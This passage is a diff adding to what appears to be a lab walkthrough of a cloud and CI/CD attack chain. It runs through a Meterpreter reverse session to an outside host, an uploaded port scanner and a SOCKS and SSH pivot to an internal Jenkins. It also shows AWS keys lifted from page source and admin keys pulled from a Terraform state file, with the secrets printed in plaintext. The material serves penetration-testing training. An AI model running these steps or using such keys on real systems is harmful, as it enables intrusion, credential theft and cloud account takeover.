@@ -1208,23 +1208,563 @@ msf6 exploit(multi/handler) >
 
 ### Enumerating the Production Container
 
+Interacting with the new session:
 
+{% code overflow="wrap" %}
+```bash
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                      Information          Connection
+  --  ----  ----                      -----------          ----------
+  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)
+
+msf6 exploit(multi/handler) > sessions -i 2
+[*] Starting interaction with 2...
+```
+{% endcode %}
+
+Reviewing network interfaces:
+
+{% code overflow="wrap" %}
+```bash
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 65536
+Flags        : UP LOOPBACK RUNNING
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+
+
+Interface 41
+============
+Name         : eth1
+Hardware MAC : 02:42:ac:1e:00:03
+MTU          : 1500
+Flags        : UP BROADCAST RUNNING MULTICAST
+IPv4 Address : 172.30.0.3
+IPv4 Netmask : 255.255.0.0
+
+
+Interface 43
+============
+Name         : eth0
+Hardware MAC : 02:42:ac:12:00:04
+MTU          : 1500
+Flags        : UP BROADCAST RUNNING MULTICAST
+IPv4 Address : 172.18.0.4
+IPv4 Netmask : 255.255.0.0
+```
+{% endcode %}
+
+Checking user and current directory:
+
+{% code overflow="wrap" %}
+```bash
+meterpreter > shell
+whoami
+root
+
+ls -alh
+total 32K
+drwxr-xr-x 1 root root  17 Jul  6 16:25 .
+drwxr-xr-x 1 root root  40 Jul  6 16:42 ..
+drwxr-xr-x 8 root root 162 Jul  6 16:41 .git
+-rw-r--r-- 1 root root 199 Jul  6 16:25 Dockerfile
+-rw-r--r-- 1 root root 15K Jul  6 16:25 README.md
+drwxr-xr-x 1 root root  52 Jul  6 16:42 app
+-rw-r--r-- 1 root root 167 Jul  6 16:25 pip.conf
+-rw-r--r-- 1 root root 196 Jul  6 16:25 requirements.txt
+-rw-r--r-- 1 root root 123 Jul  6 16:25 run.py
+```
+{% endcode %}
+
+Reviewing mounts:
+
+{% code overflow="wrap" %}
+```bash
+mount
+
+overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/XSUOTVCMJALCFZC3RDKUMDRFT7:/var/lib/docker/overlay2/l/GZ2WZHEOX36F3NXSO3JL4BYD6L:/var/lib/docker/overlay2/l/HVQUSP32SJWVAJ3KOL2QASE4W3:/var/lib/docker/overlay2/l/HE7JGACHWIPRNCT54LBN6AXOZP:/var/lib/docker/overlay2/l/ESRP43XML3BVETNT2Z7I3N2JU4:/var/lib/docker/overlay2/l/KP435SVPCD3NIUYPJPVAREWOOZ:/var/lib/docker/overlay2/l/72FQOR2NP3DWJJSQEXIRCSYJLG:/var/lib/docker/overlay2/l/XGHOLK75NEJNWWWX6CXQOTPRVX:/var/lib/docker/overlay2/l/FYRGADRJGMIS5XK5SBKPLCX6BG:/var/lib/docker/overlay2/l/Z2X5KHFJNPU35ZKBGAHJUEZT3I:/var/lib/docker/overlay2/l/5QTAPW6XADCCWCTAVASPNQT7A4:/var/lib/docker/overlay2/l/35PKZCCO3U4ARBXXGICO35VEMU:/var/lib/docker/overlay2/l/J5J2DCSN4XC4G5HJ6VLPEB3KJL:/var/lib/docker/overlay2/l/D3NHOQ5FM57FMMCEBAT575CAVI:/var/lib/docker/overlay2/l/4BJ4Q3NJFA6VRGPHR4GYYFAB4T,upperdir=/var/lib/docker/overlay2/b95da9be18e4db9ea42697d255af877c65d441522e0f02f8a628239709573bfc/diff,workdir=/var/lib/docker/overlay2/b95da9be18e4db9ea42697d255af877c65d441522e0f02f8a628239709573bfc/work)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
+...
+```
+{% endcode %}
+
+Reviewing environment variables:
+
+{% code overflow="wrap" %}
+```bash
+printenv
+
+HOSTNAME=6699d104d6c5
+SECRET_KEY=asdfasdfasdfasdf
+PYTHON_PIP_VERSION=22.3.1
+HOME=/root
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+ADMIN_PASSWORD=password
+PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d5cb0afaf23b8520f1bbcfed521017b4a95f5c01/public/get-pip.py
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+LANG=C.UTF-8
+SQLALCHEMY_TRACK_MODIFICATIONS=False
+PYTHON_VERSION=3.11.2
+PYTHON_SETUPTOOLS_VERSION=65.5.1
+PWD=/app
+PYTHON_GET_PIP_SHA256=394be00f13fa1b9aaa47e911bdb59a09c3b2986472130f30aa0bfaf7f3980637
+SQLALCHEMY_DATABASE_URI=sqlite:////data/data.db
+ADMIN_USERNAME=admin
+```
+{% endcode %}
+
+Closed and reopened meterpreter sessions:
+
+```bash
+[*] 172.18.0.4 - Meterpreter session 2 closed.  Reason: Died
+
+[*] Sending stage (24772 bytes) to 198.18.53.73
+
+[*] Meterpreter session 3 opened (10.0.1.54:4488 -> 198.18.53.73:60146)
+
+msf6 exploit(multi/handler) > sessions -i 3
+[*] Starting interaction with 3...
+
+meterpreter >
+```
 
 ### Scanning the Network
 
+Creating a python script for port scanning:
 
+{% code overflow="wrap" %}
+```python
+kali@kali:~$ nano netscan.py
+
+kali@kali:~$ cat -n netscan.py
+01  import socket
+02  import ipaddress
+03  import sys
+04
+05  def port_scan(ip_range, ports):
+06      for ip in ip_range:
+07          print(f"Scanning {ip}")
+08          for port in ports:
+09              sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+10              sock.settimeout(.2)
+11              result = sock.connect_ex((str(ip), port))
+12              if result == 0:
+13                  print(f"Port {port} is open on {ip}")
+14              sock.close()
+15
+16  ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
+17  ports = [80, 443, 8080]  # List of ports to scan
+18
+19  port_scan(ip_range, ports)
+```
+{% endcode %}
+
+Transferring netscan.py to cloud kali instance:
+
+```bash
+kali@kali:~$ scp ./netscan.py kali@34.203.75.99:/home/kali/
+kali@34.203.75.99's password: 
+netscan.py                                100%  462     2.0KB/s   00:00  
+```
+
+Uploading netscan.py to the target:
+
+```bash
+meterpreter > upload /home/kali/netscan.py /netscan.py
+[*] Uploading  : /home/kali/netscan.py -> /netscan.py
+[*] Uploaded 559.00 B of 559.00 B (100.0%): /home/kali/netscan.py -> /netscan.py
+[*] Completed  : /home/kali/netscan.py -> /netscan.py
+```
+
+Reminding ourselves o fthe network ranges we're targeting:
+
+```bash
+meterpreter > ifconfig
+
+Interface  1
+============
+Name         : lo
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 65536
+Flags        : UP LOOPBACK RUNNING
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+
+
+Interface 65
+============
+Name         : eth0
+Hardware MAC : 02:42:ac:12:00:04
+MTU          : 1500
+Flags        : UP BROADCAST RUNNING MULTICAST
+IPv4 Address : 172.18.0.4
+IPv4 Netmask : 255.255.0.0
+
+
+Interface 67
+============
+Name         : eth1
+Hardware MAC : 02:42:ac:1e:00:03
+MTU          : 1500
+Flags        : UP BROADCAST RUNNING MULTICAST
+IPv4 Address : 172.30.0.3
+IPv4 Netmask : 255.255.0.0
+```
+
+Port scanning 172.18.0.1/24 to shorten the scan time rather than /16:
+
+```bash
+meterpreter > shell
+Process 17 created.
+Channel 4 created.
+
+python /netscan.py 172.18.0.1/24
+Scanning 172.18.0.0
+Scanning 172.18.0.1
+Port 80 is open on 172.18.0.1
+Scanning 172.18.0.2
+Port 80 is open on 172.18.0.2
+Scanning 172.18.0.3
+Port 80 is open on 172.18.0.3
+Scanning 172.18.0.4
+Scanning 172.18.0.5
+Port 80 is open on 172.18.0.5
+Scanning 172.18.0.6
+...
+```
+
+{% hint style="info" %}
+When you run **netscan.py**, it might seem that the shell is frozen. This is normal while the script runs. Give it a few minutes, and it should become responsive and display the output of the scan.
+{% endhint %}
+
+Using curl to fingerprint services:
+
+```bash
+curl -vv 172.18.0.1
+...
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Server: Caddy
+< Content-Length: 0
+...
+
+curl -vv 172.18.0.2
+...
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Server: Caddy
+< Content-Length: 0
+...
+```
+
+Port scanning on 172.30.0.1/24 for the same reason:
+
+```bash
+python /netscan.py 172.30.0.1/24
+
+Scanning 172.30.0.0
+Scanning 172.30.0.1
+Port 80 is open on 172.30.0.1
+Scanning 172.30.0.2
+...
+Scanning 172.30.0.10
+Port 80 is open on 172.30.0.10
+Scanning 172.30.0.11
+...
+Scanning 172.30.0.30
+Port 8080 is open on 172.30.0.30
+Scanning 172.30.0.31
+...
+Scanning 172.30.0.50
+Port 8080 is open on 172.30.0.50
+Scanning 172.30.0.51
+...
+Scanning 172.30.0.60
+Port 8080 is open on 172.30.0.60
+Scanning 172.30.0.61
+...
+```
+
+Discovered the Jenkins Service while running curl on specific endpoins:
+
+{% code overflow="wrap" %}
+```bash
+curl 172.30.0.30:8080/
+...
+<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>
+
+...
+
+curl 172.30.0.30:8080/login
+...
+<!DOCTYPE html><html lang="en"><head resURL="/static/dd8fdc36" data-rooturl="" data-resurl="/static/dd8fdc36" data-imagesurl="/static/dd8fdc36/images"><title>Sign in [Jenkins]</title><meta name="ROBOTS" content="NOFOLLOW"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="/static/dd8fdc36/jsbundles/simple-page.css" type="text/css"></head><body><div class="simple-page" role="main"><div class="modal login"><div id="loginIntroDefault"><div class="logo"><img src="/static/dd8fdc36/images/svgs/logo.svg" alt="Jenkins logo"></div><h1>Welcome to Jenkins!</h1></div><form method="post" name="login" action="j_spring_security_check"><p class="signupTag simple-page--description">Please sign in below or <a href="signup">create an account</a>.<div class="jenkins-form-item jenkins-form-item--tight"><input autocorrect="off" autocomplete="off" name="j_username" id="j_username" placeholder="Username" type="text" autofocus="autofocus" class="jenkins-input normal" autocapitalize="off" aria-label="Username"></div><div class="jenkins-form-item jenkins-form-item--tight"><input name="j_password" placeholder="Password" type="password" class="jenkins-input normal" aria-label="Password"></div><div class="jenkins-checkbox jenkins-form-item jenkins-form-item--tight jenkins-!-margin-bottom-3"><input type="checkbox" id="remember_me" name="remember_me"><label for="remember_me">Keep me signed in</label></div><input name="from" type="hidden"><div class="submit"><button type="submit" name="Submit" class="jenkins-button jenkins-button--primary">Sign in</button></div></form><div class="footer"></div></div></div></body></html>
+```
+{% endcode %}
 
 ### Loading Jenkins
 
+<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption><p>Tunneling Diagram</p></figcaption></figure>
 
+Exiting shell and sending session to background:
+
+{% code overflow="wrap" %}
+```bash
+exit
+[-] core_channel_interact: Operation failed: Unknown error
+
+meterpreter > background
+[*] Backgrounding session 1...
+```
+{% endcode %}
+
+Using SOCKS proxy module and running it:
+
+```bash
+msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
+
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+
+msf6 auxiliary(server/socks_proxy) > run -j
+[*] Auxiliary module running as background job 1.
+```
+
+Creating a route:
+
+{% code overflow="wrap" %}
+```bash
+msf6 exploit(server/socks_proxy) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                      Information          Connection
+  --  ----  ----                      -----------          ----------
+  2         meterpreter python/linux  root @ 6699d104d6c5  10.0.1.54:4488 -> 198.18.53.73:37604 (172.18.0.4)
+
+msf6 auxiliary(server/socks_proxy) > route add 172.30.0.1 255.255.0.0 2
+```
+{% endcode %}
+
+<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption><p>Tunneling Diagram with no SSH tunnel</p></figcaption></figure>
+
+Creating local forward ssh tunnel:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ ssh -fN -L localhost:1080:localhost:1080 kali@192.88.99.76
+kali@192.88.99.76's password:
+
+kali@kali:~$ ss -tulpn
+Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process                          
+tcp    LISTEN  0       128          127.0.0.1:1080        0.0.0.0:*     users:(("ssh",pid=75991,fd=5))  
+tcp    LISTEN  0       128              [::1]:1080           [::]:*     users:(("ssh",pid=75991,fd=4))  
+```
+{% endcode %}
+
+Setup firefox proxy to SOCK5 to 127.0.0.1 on port 1080 or a FoxyProxy profile for SOCKS5 to 127.0.0.1 on port 1080.
+
+<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption><p>Adding a SOCKS proxy to Firefox</p></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption><p>Adding a SOCKS proxy to FoxyProxy</p></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption><p>Jenkins on the internal network of our target via Firefox</p></figcaption></figure>
 
 ### Exploiting Jenkins
 
+<figure><img src="../../../.gitbook/assets/image (62).png" alt=""><figcaption><p>Self-registering a Jenkins account</p></figcaption></figure>
 
+<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption><p>Navigating to the Dashboard</p></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (64).png" alt=""><figcaption><p>Company Directory</p></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption><p>Researching the S3 Explorer plugin</p></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (66).png" alt=""><figcaption><p>Navigating to S3 Explorer</p></figcaption></figure>
+
+<figure><img src="../../../.gitbook/assets/image (67).png" alt=""><figcaption><p>View Source on S3 Explorer</p></figcaption></figure>
+
+Finding the AWS key in Source:
+
+{% code overflow="wrap" %}
+```markup
+...<div id="page-wrapper" ng-controller="SettingsController"></div></div><input id="awsregion" type="hidden" value="us-east-1"><input id="awsid" type="hidden" value="AKIAUBHUBEGIMWGUDSWQ"><input id="awskey" type="hidden" value="e7pRWvsGgTyB8UHNXilvCZdC9xZPA8oF3KtUwaJ5"><input id="bucket" type="hidden" value="company-directory-9b58rezp3vvkf90f"></div></div><footer class="page-footer"><div class="container-fluid"><div class="page-footer__flex-row"><div class="page-footer__footer-id-placeholder" id="footer"></div><div class="page-footer__links page-footer__links--white jenkins_ver"><a rel="noopener noreferrer" href="https://www.jenkins.io/" target="_blank">Jenkins 2.385</a></div></div></div></footer></body></html><script src="http://automation.offseclab.io/plugin/s3explorer/js/s3explorer.js"></script>
+```
+{% endcode %}
 
 ### Enumerating with Discovered Credentials
 
+Configuring a profile with our discovered AWS credentials:
 
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws configure --profile=stolen-s3
+AWS Access Key ID [None]: AKIAUBHUBEGIMWGUDSWQ
+AWS Secret Access Key [None]: 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
+Default region name [None]: us-east-1
+Default output format [None]: 
+```
+{% endcode %}
+
+Getting the Account ID and User Name:
+
+```bash
+kali@kali:~$ aws --profile=stolen-s3 sts get-caller-identity
+{
+    "UserId": "AIDAUBHUBEGIFYDAVQPLB",
+    "Account": "347537569308",
+    "Arn": "arn:aws:iam::277537169808:user/s3_explorer"
+}
+```
+
+Listing S3 bucket for Company Directory:
+
+```bash
+kali@kali:~$ aws --profile=stolen-s3 s3 ls company-directory-9b58rezp3vvkf90f
+2023-07-06 13:49:19        117 Alen.I.vcf
+2023-07-06 13:49:19        118 Goran.B.vcf
+2023-07-06 13:49:19        117 Zeljko.B.vcf
+```
+
+Listing all Buckets from stolen-s3 account:
+
+```bash
+kali@kali:~$ aws --profile=stolen-s3 s3api list-buckets
+{
+    "Buckets": [
+        {
+            "Name": "company-directory-9b58rezp3vvkf90f",
+            "CreationDate": "2023-07-06T16:21:16+00:00"
+        },
+        {
+            "Name": "tf-state-9b58rezp3vvkf90f",
+            "CreationDate": "2023-07-06T16:21:16+00:00"
+        }
+    ]
+    ...
+}
+```
+
+The prefix "tf" in cloud environments often refers to Terraform, and a Terraform state often refers to the file that is used to store the current configuration, including _potential secrets_.
 
 ### Discovering the State File and Escalating to Admin
 
+Listing the Terraform State Bucket:
+
+```bash
+kali@kali:~$ aws --profile=stolen-s3 s3 ls tf-state-9b58rezp3vvkf90f    
+2023-07-06 12:19:16       6731 terraform.tfstate
+```
+
+Copying Terraform State File to our local Kali machine:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws --profile=stolen-s3 s3 cp s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate ./
+download: s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate to ./terraform.tfstate
+```
+{% endcode %}
+
+Reviewing State File - Users:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ cat -n terraform.tfstate
+001  {
+...
+007      "user_list": {
+008        "value": [
+009          {
+010            "email": "Goran.Bregovic@offseclab.io",
+011            "name": "Goran.B",
+012            "phone": "+1 555-123-4567",
+013            "policy": "arn:aws:iam::aws:policy/AdministratorAccess"
+014          },
+015          {
+016            "email": "Zeljko.Bebek@offseclab.io",
+017            "name": "Zeljko.B",
+018            "phone": "+1 555-123-4568",
+019            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
+020          },
+021          {
+022            "email": "Alen.Islamovic@offseclab.io",
+023            "name": "Alen.I",
+024            "phone": "+1 555-123-4569",
+025            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
+026          }
+027        ],
+...
+041    },
+```
+{% endcode %}
+
+Reviewing State File - Keys:
+
+```bash
+042    "resources": [
+043      {
+...
+049          {
+050            "index_key": "Alen.I",
+051            "schema_version": 0,
+052            "attributes": {
+...
+056              "id": "AKIAUBHUBEGIKIZJ7OEI",
+...
+059              "secret": "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",
+...
+063            },
+...
+069          },
+070          {
+071            "index_key": "Goran.B",
+072            "schema_version": 0,
+073            "attributes": {
+...
+077              "id": "AKIAUBHUBEGIGZN3IP46",
+...
+080              "secret": "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",
+...
+084            },
+...
+090          },
+...
+```
+
+Configuring Goran.B Profile using AWS CLI:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws configure --profile=goran.b                                                 
+AWS Access Key ID [None]: AKIAUBHUBEGIGZN3IP46
+AWS Secret Access Key [None]: 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
+Default region name [None]: us-east-1
+Default output format [None]: 
+```
+{% endcode %}
+
+Listing attached user policies with Goran.B profile:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
+{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}
+```
+{% endcode %}
